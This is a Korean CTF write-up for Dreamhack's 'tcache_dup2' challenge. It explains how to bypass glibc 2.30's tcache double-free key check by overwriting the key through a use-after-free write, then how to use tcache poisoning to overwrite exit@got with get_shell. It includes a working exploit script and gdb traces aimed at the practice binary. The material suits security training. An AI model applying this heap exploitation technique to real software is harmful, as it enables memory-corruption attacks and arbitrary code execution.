# tcache_dup2 풀이 노트

Dreamhack `tcache_dup2` — glibc **2.30**의 tcache double free **key 검사**를 우회해서
`exit@got`를 `get_shell`로 덮기.

바이너리: glibc 2.30, no-PIE. (개념 배경은 `../double_free/writeup.md`, 기본형은 `../tcache_dup/writeup.md`)

---

## 0. 취약점 요약 & tcache_dup와의 차이

| | `tcache_dup` (2.27) | `tcache_dup2` (2.30) |
|---|---|---|
| double free 검사 | **없음** → `free(A);free(A)` 바로 됨 | **key 검사 있음** → 그냥 하면 abort |
| 핵심 우회 | 불필요 | **`modify`로 key 덮어 무력화** |
| 재사용 창구 | free 후 포인터 미초기화 | `modify_heap()`이 free된 청크도 편집 허용 |
| 타겟 | `free@got` | `exit@got` (종료 경로로 트리거) |

근본 버그는 두 개:
1. `delete_heap()`이 `free(ptr[idx])` 후 **`ptr[idx]=NULL`을 안 함** → dangling pointer.
2. `modify_heap()`이 인덱스만 맞으면 **free된 청크의 메모리도 그대로 덮어쓰게 해줌** → UAF-write.

---

## 1. glibc 2.29+ 의 tcache double free 검사 (key)

2.29부터 free된 tcache 청크는 user data의 **2번째 8바이트(offset 8)** 에 `key`를 적는다.

```c
// tcache_entry 구조 (개념)
typedef struct tcache_entry {
  struct tcache_entry *next;   // offset 0  ← poisoning 대상
  struct tcache_perthread_struct *key;  // offset 8  ← double free 탐지용
} tcache_entry;

// tcache_put / _int_free 에서:
e->key = tcache;                 // free 시 key = tcache_perthread_struct 주소 기입
// 재free 시:
if (__glibc_unlikely (e->key == tcache))   // 이미 key가 박혀있으면
  // → 같은 bin을 순회하며 "정말 중복인지" 확인 후 "double free detected" abort
```

즉 **"이 청크 key가 이미 tcache 주소와 같다 = 이미 free된 것"** 으로 판단해 2차 free를 막는다.

**우회 원리:** 2차 free **전에** 그 `key`(offset 8)를 **다른 값으로 덮으면**, 검사가
"처음 free되는 청크"로 착각하고 통과시킨다. 여기서 `modify_heap()`이 그 구멍을 열어준다.

---

## 2. 소스에서 핵심만

```c
char *ptr[7];

void modify_heap() {               // ★ free된 청크도 편집 가능 = key 덮기 수단
    scanf("%ld", &idx);
    if (idx >= 7) exit(0);
    scanf("%ld", &size);
    if (size > 0x10) exit(0);      // 최대 16바이트 → next(8) + key(8) 딱 덮기 좋음
    read(0, ptr[idx], size);       // ptr[idx]가 free됐어도 그대로 씀 (UAF-write)
}

void delete_heap() {
    scanf("%ld", &idx);
    if (idx >= 7) exit(0);
    if (!ptr[idx]) exit(0);
    free(ptr[idx]);                // ★ ptr[idx]=NULL 없음 → double free 여지
}

void get_shell() { system("/bin/sh"); }
```

`modify`의 `size > 0x10` 체크 덕에 **최대 16바이트** = `next`(offset 0) + `key`(offset 8)를
한 번에 덮을 수 있다. 이게 key 우회의 핵심 도구.

---

## 3. 공격 아이디어

1. 같은 크기 청크 3개(ptr[0..2]) 만들고 모두 free → tcache[0x20]에 정상 적재.
   (여러 개 두는 건 counts/entry를 안정적으로 세팅하고 순서를 확실히 하기 위함)
2. `modify(0, 16, 'A'*16)` → ptr[0]의 `next`와 **`key`를 오염** → key 검사 무력화.
3. `delete(0)` → **2차 free 통과** (double free 성립).
4. 이후는 일반 tcache poisoning:
   - `create(exit@got)` → ptr[0] 받으며 `next = exit@got`.
   - `create(dummy)` → 원본 소비.
   - `create(get_shell)` → `exit@got`를 청크로 받아 **get_shell 주소 기입 (GOT 덮기)**.
5. 메뉴에서 **잘못된 값(7 등)을 넣어 `exit(0)` 경로 유도** → `exit()` 호출이 `get_shell()` → **shell**.

> 왜 `exit@got`? `modify/delete/create` 들이 `idx >= 7`이면 `exit(0)`을 부른다.
> 그래서 `exit`의 GOT를 덮어두고 일부러 범위 밖 인덱스를 넣으면 그 자리에서 쉘이 터진다.

---

## 4. poc 트레이스 (`poc.py`)

```python
create(0x10, b'aaaaaaaa')   # ptr[0]  (청크 0x20 → tcache[0x20])
create(0x10, b'bbbbbbbb')   # ptr[1]
create(0x10, b'cccccccc')   # ptr[2]
delete(2); delete(1); delete(0)      # tcache[0x20]: 0 -> 1 -> 2  (정상 free, key 각각 박힘)

modify(0, 16, b'A'*16)      # ptr[0].next & key 를 'AAAA...'로 오염 → key 검사 무력화
delete(0)                   # ★ double free 통과

create(0x10, p64(e.got['exit']))   # ptr[0] 받음 + next = exit@got  (poisoning)
create(0x10, b'B'*8)               # 원본 소비 → bin 맨앞: exit@got
create(0x10, p64(get_shell))       # exit@got 받아 get_shell 기입 (GOT 덮기)

# 메뉴 "2"(modify) 선택 후 idx=7 입력 → idx>=7 → exit(0) → get_shell()
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7')
```

| 단계 | tcache[0x20] | 설명 |
|---|---|---|
| create ×3 | — | ptr[0..2] 확보 |
| delete 2,1,0 | `0 -> 1 -> 2` | 정상 free (각 청크에 key 기입됨) |
| `modify(0,16,'A'*16)` | `0(next·key 오염) -> ...` | **key 검사 무력화** |
| `delete(0)` | `0 -> ...` | **double free 성립 (인조 UAF)** |
| `create(exit@got)` | `0 -> exit@got` | ptr[0] 받아 **next=exit@got (poisoning)** |
| `create(B)` | `exit@got` | 원본 소비 |
| `create(get_shell)` | — | exit@got 받아 **GOT=get_shell (임의 쓰기)** |
| idx=7 입력 | — | `exit(0)` → `get_shell()` → **shell** |

---

## 5. gdb로 확인할 포인트

- `delete(0)` 3번째(정상) 직후 free 청크의 offset 8에 key가 박혔는지:
  ```
  pwndbg> x/2gx <ptr0>
  <ptr0>: 0x<next>  0x<key = tcache_perthread_struct>   ← 두 번째가 key
  ```
- `modify(0,16,'A'*16)` 직후 key가 `0x4141...`로 바뀌었는지 (검사 무력화 확인):
  ```
  pwndbg> x/2gx <ptr0>
  <ptr0>: 0x4141414141414141  0x4141414141414141
  ```
- `create(get_shell)` 후 `exit@got` 내용:
  ```
  pwndbg> x/gx &exit@got
  <exit@got>: 0x<get_shell>
  ```

---

## 6. 되짚기

- 2.29+ tcache double free는 **key(offset 8) 검사**로 막힌다. 우회는 **2차 free 전에 key 덮기** 한 줄.
- 그 "덮기"를 가능케 하는 건 `modify_heap()`의 **free된 청크 편집 허용**(전형적 UAF-write).
- `modify`의 `size≤0x10` 제한이 오히려 `next`+`key` 16바이트를 깔끔히 덮게 해준다.
- no-PIE + `get_shell` → **libc leak 불필요**, GOT 덮기로 끝 (`tcache_dup`과 동일 철학).
- 트리거를 `exit@got` + 범위밖 인덱스(`exit(0)`)로 잡은 게 이 문제의 깔끔한 포인트.
- fastbin이었다면 key가 아니라 **맨앞 검사 + size 검사**가 문제였을 것 (`../double_free/writeup.md` 4장).
